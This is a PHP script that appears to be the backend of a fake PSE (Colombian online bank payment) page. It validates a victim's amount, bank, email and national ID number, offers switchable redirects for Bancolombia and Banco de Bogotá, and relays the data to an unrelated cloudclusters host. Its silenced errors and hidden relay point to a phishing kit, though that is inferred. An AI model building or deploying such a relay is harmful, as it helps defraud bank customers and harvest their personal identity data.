<?php

error_reporting(0);
ini_set('display_errors', 0);
header('Content-Type: application/json');

// === Configuración de redirección directa por banco ===
$redireccion_bancolombia = false;  // true = activado, false = desactivado
$url_bancolombia = "";

$redireccion_bogota = true;  // true = activado, false = desactivado
$url_bogota = "";

// === Protección Antiflood / Anti-Spam / Anti-DDoS básica ===
$ip = $_SERVER['REMOTE_ADDR'];
$rate_limit_file = sys_get_temp_dir() . "/rate_limit_" . md5($ip) . ".txt";
$time_limit_seconds = 30;

if (file_exists($rate_limit_file)) {
    $last_access = file_get_contents($rate_limit_file);
    if (time() - $last_access < $time_limit_seconds) {
        echo json_encode(["Error" => "Demasiadas solicitudes. Intenta de nuevo en 30 segundos."], JSON_PRETTY_PRINT);
        exit;
    }
}
file_put_contents($rate_limit_file, time());

// Lista de bancos permitidos
$allowed_banks = [
    "ALIANZA FIDUCIARIA", "BAN100", "BANCAMIA S.A.", "BANCO AGRARIO", "BANCO AV VILLAS",
    "BANCO BBVA COLOMBIA S.A.", "BANCO CAJA SOCIAL", "BANCO COOPERATIVO COOPCENTRAL",
    "BANCO DE BOGOTA", "BANCO DE OCCIDENTE", "BANCO FALABELLA", "BANCO FINANDINA S.A. BIC",
    "BANCO GNB SUDAMERIS", "BANCO ITAU", "BANCO J.P. MORGAN COLOMBIA S.A.",
    "BANCO MUNDO MUJER S.A.", "BANCO PICHINCHA S.A.", "BANCO POPULAR",
    "BANCO SANTANDER COLOMBIA", "BANCO SERFINANZA", "BANCO UNION antes GIROS", "BANCOLOMBIA",
    "BANCOOMEVA S.A.", "BOLD CF", "CFA COOPERATIVA FINANCIERA", "CITIBANK", "COINK SA",
    "COLTEFINANCIERA", "CONFIAR COOPERATIVA FINANCIERA", "COTRAFA", "Crezcamos-MOSí", "DALE",
    "DING", "FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO", "GLOBAL66", "IRIS",
    "JFK COOPERATIVA FINANCIERA", "LULO BANK", "MOVII S.A.", "NEQUI", "NU", "POWWI",
    "RAPPIPAY", "SCOTIABANK COLPATRIA", "UALÁ"
];

// Leer datos del POST (form-urlencoded)
// Formato: amount=225627&bankCode=NEQUI&Correo=email@gmail.com&Documento=123123
$request_data = [
    'amount' => $_POST['amount'] ?? null,
    'bankCode' => $_POST['bankCode'] ?? null,
    'Correo' => $_POST['Correo'] ?? null,
    'Documento' => $_POST['Documento'] ?? null,
];

// Validar que llegaron datos
if (empty($_POST)) {
    echo json_encode(["Error" => "No se recibieron datos"], JSON_PRETTY_PRINT);
    exit;
}

// === Funciones de sanitización robustas ===
function sanitize_email($email) {
    if (!$email || !is_string($email)) return null;

    // Limpiar email - solo caracteres válidos
    $email = strtolower(trim($email));
    $email = preg_replace('/[^a-z0-9@._-]/', '', $email);
    $email = substr($email, 0, 100);

    // Validar formato de email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) return null;

    return $email;
}

function sanitize_document($doc) {
    if (!$doc || !is_string($doc)) return null;

    // Solo números
    $doc = preg_replace('/\D/', '', $doc);
    $doc = substr($doc, 0, 15);

    // Mínimo 6 dígitos
    if (strlen($doc) < 6) return null;

    return $doc;
}

function sanitize_amount($amount) {
    $amount = filter_var($amount, FILTER_VALIDATE_INT);

    // Validar rango razonable
    if ($amount === false || $amount <= 2000 || $amount > 100000000) return null;

    return $amount;
}

// Sanitizar y validar todos los inputs
$amount = sanitize_amount($request_data['amount']);
$correo = sanitize_email($request_data['Correo']);
$documento = sanitize_document($request_data['Documento']);
$bank = isset($request_data['bankCode']) && is_string($request_data['bankCode']) ? trim($request_data['bankCode']) : null;

// Validaciones estrictas
if ($amount === null) {
    echo json_encode(["Error" => "Monto inválido"], JSON_PRETTY_PRINT);
    exit;
}

if ($correo === null) {
    echo json_encode(["Error" => "Correo electrónico inválido"], JSON_PRETTY_PRINT);
    exit;
}

if ($documento === null) {
    echo json_encode(["Error" => "Número de documento inválido"], JSON_PRETTY_PRINT);
    exit;
}

// Validación estricta del banco (comparación exacta)
if (!$bank || !in_array($bank, $allowed_banks, true)) {
    echo json_encode(["Error" => "Banco no permitido"], JSON_PRETTY_PRINT);
    exit;
}

// === Redirección directa para Bancolombia y Banco de Bogotá ===
if ($redireccion_bancolombia && $bank === "BANCOLOMBIA") {
    echo json_encode(["URL" => $url_bancolombia], JSON_PRETTY_PRINT);
    exit;
}
if ($redireccion_bogota && $bank === "BANCO DE BOGOTA") {
    echo json_encode(["URL" => $url_bogota], JSON_PRETTY_PRINT);
    exit;
}

// Preparar datos para enviar
$url = "https://phpclusters-196676-0.cloudclusters.net/apipsedaviplata2/PSE.php";
$data = http_build_query([
    "Documento" => $documento,
    "Correo" => $correo,
    "Banco" => $bank,
    "Monto" => $amount
]);
$headers = [
    "Content-Type: application/x-www-form-urlencoded"
];

// Enviar POST con cURL (timeout 90 segundos)
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 90);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Mostrar respuesta
if ($httpCode >= 200 && $httpCode < 300) {
    echo $response;
} else {
    echo json_encode(["Error" => "Fallo la conexión al servidor externo"], JSON_PRETTY_PRINT);
}
?>
